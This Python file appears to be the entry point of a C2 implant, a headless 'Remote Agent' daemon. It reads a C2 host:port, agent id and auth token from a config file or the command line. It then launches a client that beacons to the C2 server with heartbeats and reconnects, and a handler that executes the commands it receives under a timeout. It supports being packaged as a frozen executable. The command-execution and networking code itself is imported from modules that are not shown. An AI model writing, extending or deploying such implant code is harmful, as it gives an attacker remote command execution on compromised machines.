"""Remote Agent entry point.

Reads configuration from file and/or CLI args, starts the AgentClient,
and runs until interrupted. Headless daemon: no local CLI / Web UI.
"""

import argparse
import asyncio
import json
import logging
import os
import sys
from pathlib import Path

if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, base_path)

from remote.agent_client import AgentClient
from remote.handler import Handler


REQUIRED_FIELDS = {"c2_address", "agent_id", "auth_token"}


def _load_config_file(path: str) -> dict:
    p = Path(path)
    if not p.is_absolute():
        p = Path(base_path) / path
    if not p.exists():
        return {}
    with open(p, "r", encoding="utf-8") as f:
        return json.load(f)


def _parse_c2_address(addr):
    if isinstance(addr, (tuple, list)) and len(addr) == 2:
        return str(addr[0]), int(addr[1])
    if not isinstance(addr, str):
        raise argparse.ArgumentTypeError(f"invalid c2-address: {addr!r} (expected host:port)")
    host, _, port = addr.rpartition(":")
    if not host or not port:
        raise argparse.ArgumentTypeError(f"invalid c2-address: {addr} (expected host:port)")
    try:
        return host, int(port)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid port: {port}")


def _build_argparser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Remote Agent daemon")
    p.add_argument("--config", default=None, help="Optional config file (JSON)")
    p.add_argument("--c2-address", default=None, type=_parse_c2_address,
                   help="C2 host:port (e.g. 192.168.1.100:8881)")
    p.add_argument("--agent-id", default=None, help="Unique agent id")
    p.add_argument("--auth-token", default=None, help="Pre-shared auth token")
    p.add_argument("--heartbeat-interval", type=int, default=None,
                   help="Heartbeat interval in seconds (default 30)")
    p.add_argument("--cmd-timeout", type=int, default=None,
                   help="Command execution timeout in seconds (default 60)")
    p.add_argument("--reconnect-initial", type=float, default=None,
                   help="Initial reconnect delay seconds (default 1)")
    p.add_argument("--reconnect-max", type=float, default=None,
                   help="Max reconnect delay seconds (default 60)")
    p.add_argument("--log-level", default=None,
                   help="Log level (DEBUG/INFO/WARNING/ERROR)")
    return p


def _merge_config(args: argparse.Namespace) -> dict:
    cfg = {}
    if args.config:
        cfg.update(_load_config_file(args.config))

    cli_overrides = {
        "c2_address": args.c2_address,
        "agent_id": args.agent_id,
        "auth_token": args.auth_token,
        "heartbeat_interval_sec": args.heartbeat_interval,
        "cmd_timeout": args.cmd_timeout,
        "reconnect_initial_sec": args.reconnect_initial,
        "reconnect_max_sec": args.reconnect_max,
    }
    for k, v in cli_overrides.items():
        if v is not None:
            cfg[k] = v

    missing = [f for f in REQUIRED_FIELDS if f not in cfg or cfg[f] in (None, "")]
    if missing:
        raise SystemExit(f"missing required config: {', '.join(missing)} "
                         f"(provide via --{missing[0].replace('_', '-')} or config file)")

    return cfg


def _setup_logging(level: str) -> None:
    logging.basicConfig(
        level=getattr(logging, level.upper(), logging.INFO),
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )


async def _run(cfg: dict) -> None:
    c2_host, c2_port = _parse_c2_address(cfg["c2_address"])
    client = AgentClient(
        c2_host=c2_host,
        c2_port=c2_port,
        agent_id=cfg["agent_id"],
        auth_token=cfg["auth_token"],
        heartbeat_interval=cfg.get("heartbeat_interval_sec", 30),
        reconnect_initial=cfg.get("reconnect_initial_sec", 1.0),
        reconnect_max=cfg.get("reconnect_max_sec", 60.0),
    )
    handler = Handler(
        cmd_timeout=cfg.get("cmd_timeout", 60),
        on_shutdown=client.request_shutdown,
    )
    client.set_packet_handler(handler)
    await client.run()


def main() -> None:
    args = _build_argparser().parse_args()
    cfg = _merge_config(args)
    log_level = cfg.get("log_level") or args.log_level or "INFO"
    _setup_logging(log_level)
    logger = logging.getLogger("remote")
    logger.info(f"agent '{cfg['agent_id']}' starting; C2={cfg['c2_address']}")
    try:
        asyncio.run(_run(cfg))
    except KeyboardInterrupt:
        logger.info("interrupted, exiting")


if __name__ == "__main__":
    main()